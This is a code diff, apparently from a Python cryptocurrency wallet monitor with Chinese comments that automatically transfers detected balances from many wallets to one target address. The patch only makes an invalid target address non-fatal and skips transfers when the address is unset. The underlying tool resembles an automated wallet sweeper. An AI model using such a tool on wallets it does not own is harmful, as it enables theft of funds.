@@ -124,13 +124,20 @@ def resolve_target_address() -> str:
     # 3) 回退默认值
     return DEFAULT_TARGET_ADDRESS
 
-# 解析并验证目标地址
+# 解析并验证目标地址（不再阻止程序启动）
 TARGET_ADDRESS = resolve_target_address()
-if not validate_ethereum_address(TARGET_ADDRESS):
-    print(f"❌ 错误: 目标地址格式无效: {TARGET_ADDRESS}")
-    print(f"💡 正确格式应该是: 0x + 40个十六进制字符")
-    print(f"💡 可通过设置环境变量 TARGET_ADDRESS 或在 config.json 中设置 target_address 来指定")
-    sys.exit(1)
+TARGET_ADDRESS_VALID = validate_ethereum_address(TARGET_ADDRESS)
+if not TARGET_ADDRESS_VALID:
+    print(f"⚠️ 提示: 目标地址未配置或格式无效: {TARGET_ADDRESS}")
+    print(f"💡 正确格式: 0x + 40个十六进制字符。可设置环境变量 TARGET_ADDRESS 或在 config.json 设置 target_address")
+
+def short_address(address: str) -> str:
+    try:
+        if validate_ethereum_address(address):
+            return f"{address[:12]}...{address[-8:]}"
+        return "未设置"
+    except:
+        return "未设置"
 
 # 数据文件
 WALLETS_FILE = "wallets.json"
@@ -1538,9 +1545,13 @@ class WalletMonitor:
                         print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
                         print(f"{Fore.CYAN}💵 余额: {balance:.8f} {currency}{Style.RESET_ALL}")
                         
-                        # 自动转账
-                        print(f"{Fore.YELLOW}🚀 开始自动转账...{Style.RESET_ALL}")
-                        success = await self.transfer_balance_optimized(wallet, network_key, balance)
+                        # 自动转账（当目标地址有效时）
+                        if not TARGET_ADDRESS_VALID:
+                            print(f"{Fore.RED}❌ 目标地址未设置或无效，跳过转账。请设置 TARGET_ADDRESS 后重试{Style.RESET_ALL}")
+                            success = False
+                        else:
+                            print(f"{Fore.YELLOW}🚀 开始自动转账...{Style.RESET_ALL}")
+                            success = await self.transfer_balance_optimized(wallet, network_key, balance)
                         
                         if success:
                             print(f"{Fore.GREEN}🎉 自动转账完成!{Style.RESET_ALL}")
@@ -1562,7 +1573,8 @@ class WalletMonitor:
         print(f"\n{Fore.GREEN}🎯 启动智能监控系统{Style.RESET_ALL}")
         print(f"{Fore.CYAN}📊 监控钱包: {len(self.wallets)} 个{Style.RESET_ALL}")
         print(f"{Fore.CYAN}🌐 支持网络: {len(SUPPORTED_NETWORKS)} 个{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}🎯 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
+        tgt = TARGET_ADDRESS if TARGET_ADDRESS_VALID else "未设置"
+        print(f"{Fore.CYAN}🎯 目标地址: {tgt}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}💡 按 Ctrl+C 停止监控{Style.RESET_ALL}")
         
         self.monitoring_active = True
